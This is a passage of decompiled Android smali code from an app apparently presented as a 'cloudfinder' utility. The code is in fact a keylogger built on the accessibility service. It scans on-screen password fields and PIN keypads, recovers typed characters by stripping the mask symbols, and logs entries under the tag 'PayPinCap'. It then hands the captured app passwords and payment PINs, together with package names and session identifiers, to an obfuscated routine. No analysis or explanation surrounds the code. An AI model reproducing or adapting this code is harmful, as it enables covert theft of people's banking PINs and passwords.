    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p2

    sget-object p3, Lڝږ؁ڋ/ك;->ء:[Ljava/lang/String;

    array-length v2, p3

    move v5, v4

    :goto_b
    if-ge v5, v2, :cond_1a

    aget-object v6, p3, v5

    invoke-virtual {p2, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_19

    :goto_c
    move p2, v1

    goto :goto_d

    :cond_19
    add-int/lit8 v5, v5, 0x1

    goto :goto_b

    :cond_1a
    move p2, v4

    :goto_d
    const-string p3, " key="

    const-string v2, "PayPinCap"

    if-eqz p2, :cond_1b

    new-instance p0, Ljava/lang/StringBuilder;

    const-string p2, "CONFIRM_KEY pkg="

    invoke-direct {p0, p2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v2, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lڝږ؁ڋ/ك;->ء()V

    return-void

    :cond_1b
    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1c

    goto :goto_f

    :cond_1c
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p2

    sget-object v5, Lڝږ؁ڋ/ك;->آ:[Ljava/lang/String;

    array-length v6, v5

    move v7, v4

    :goto_e
    if-ge v7, v6, :cond_1e

    aget-object v8, v5, v7

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1d

    goto :goto_f

    :cond_1d
    add-int/lit8 v7, v7, 0x1

    goto :goto_e

    :cond_1e
    move v1, v4

    :goto_f
    invoke-static {p1}, Lڝږ؁ڋ/ك;->؋(Ljava/lang/String;)V

    const-string p2, "click"

    if-eqz v1, :cond_1f

    new-instance p3, Ljava/lang/StringBuilder;

    const-string v0, "DELETE_KEY pkg="

    invoke-direct {p3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {v2, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p0

    invoke-static {v3, p1, p2, p0}, Lڝږ؁ڋ/ك;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ك;->ة()V

    return-void

    :cond_1f
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "KEY_CLICK pkg="

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " session="

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p3, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {v2, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p1, p2, p0}, Lڝږ؁ڋ/ك;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ك;->ة()V

    return-void
.end method

.method public static ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

    sget-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-object v1, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-eqz p3, :cond_1

    goto :goto_0

    :cond_1
    const-string p3, ""

    :goto_0
    move-object v2, p3

    const-string v5, "apppwd"

    const/4 v7, 0x0

    move-object v3, p1

    move-object v4, p2

    move-object v6, p0

    invoke-static/range {v1 .. v7}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static ا(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)V
    .locals 6

    if-eqz p0, :cond_7

    const/16 v0, 0x8

    if-le p2, v0, :cond_0

    goto/16 :goto_4

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_6

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, ":"

    invoke-static {p1, v1}, Landroidx/activity/result/؋;->ت(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lڝږ؁ڋ/ك;->ج:Ljava/util/concurrent/ConcurrentHashMap;

    invoke-virtual {v2, v1}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    if-eqz v3, :cond_1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_6

    :cond_1
    invoke-virtual {v2, v1, v0}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "tree_scan"

    const/4 v2, 0x0

    if-eqz v3, :cond_5

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v5

    if-le v4, v5, :cond_5

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    if-gt v4, v3, :cond_2

    goto :goto_0

    :cond_2
    invoke-static {v0}, Lڝږ؁ڋ/ك;->ت(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_3

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {v0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-static {v0}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-static {v0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    :cond_3
    :goto_0
    if-eqz v2, :cond_6

    invoke-static {p1}, Lڝږ؁ڋ/ك;->؋(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "TREE_SCAN pkg="

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " char="

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v3, "PayPinCap"

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    :cond_4
    const-string v0, ""

    :goto_1
    invoke-static {v2, p1, v1, v0}, Lڝږ؁ڋ/ك;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ك;->ة()V

    goto :goto_2

    :cond_5
    if-eqz v3, :cond_6

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    if-ge v0, v3, :cond_6

    invoke-static {p1}, Lڝږ؁ڋ/ك;->؋(Ljava/lang/String;)V

    const-string v0, "[DEL]"

    invoke-static {v0, p1, v1, v2}, Lڝږ؁ڋ/ك;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_6
    :goto_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    :goto_3
    if-ge v1, v0, :cond_7

    const/16 v2, 0x1e

    if-ge v1, v2, :cond_7

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    add-int/lit8 v3, p2, 0x1

    invoke-static {v2, p1, v3}, Lڝږ؁ڋ/ك;->ا(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_3

    :cond_7
    :goto_4
    return-void
.end method

.method public static ب(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;)V
    .locals 6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lڝږ؁ڋ/ك;->ا:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x12c

    cmp-long v2, v2, v4

    if-gez v2, :cond_0

    return-void

    :cond_0
    sput-wide v0, Lڝږ؁ڋ/ك;->ا:J

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-nez p0, :cond_1

    return-void

    :cond_1
    const/4 v0, 0x0

    :try_start_1
    invoke-static {p0, p1, v0}, Lڝږ؁ڋ/ك;->ا(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    sget-boolean v1, Lڝږ؁ڋ/ك;->ث:Z

    if-nez v1, :cond_3

    invoke-static {p1}, Lڝږ؁ڋ/ك;->آ(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v1, Lڝږ؁ڋ/ك;->ة:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    sget-object v1, Lڝږ؁ڋ/ك;->ت:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    :try_start_2
    invoke-static {p0, v0}, Lڝږ؁ڋ/ك;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    sget-object v1, Lڝږ؁ڋ/ك;->ة:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v2

    const/16 v3, 0x8

    if-lt v2, v3, :cond_2

    const/4 v0, 0x1

    :cond_2
    sput-boolean v0, Lڝږ؁ڋ/ك;->ث:Z

    sget-boolean v0, Lڝږ؁ڋ/ك;->ث:Z

    if-eqz v0, :cond_3

    sput-object p1, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    const-string v0, "KEYPAD_FOUND_ON_SCAN pkg="

    const-string v2, " buttons="

    invoke-static {v0, p1, v2}, Landroidx/activity/result/؋;->ث(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "PayPinCap"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_3
    :try_start_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    return-void
.end method

.method public static ة()V
    .locals 4

    sget-object v0, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    sget-object v1, Lڝږ؁ڋ/ك;->؋:Landroid/os/Handler;

    if-eqz v0, :cond_0

    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    const/4 v0, 0x0

    sput-object v0, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    :cond_0
    new-instance v0, Lڝږ؁ڋ/ا;

    const/16 v2, 0x9

    invoke-direct {v0, v2}, Lڝږ؁ڋ/ا;-><init>(I)V

    sput-object v0, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    const-wide/16 v2, 0x1388

    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static ت(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_1

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const-string v3, "\u2022\u25cf\u25c9\u2731\ufe61*\u25cb\u26ab"

    invoke-virtual {v3, v2}, Ljava/lang/String;->indexOf(I)I

    move-result v3

    if-gez v3, :cond_0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method
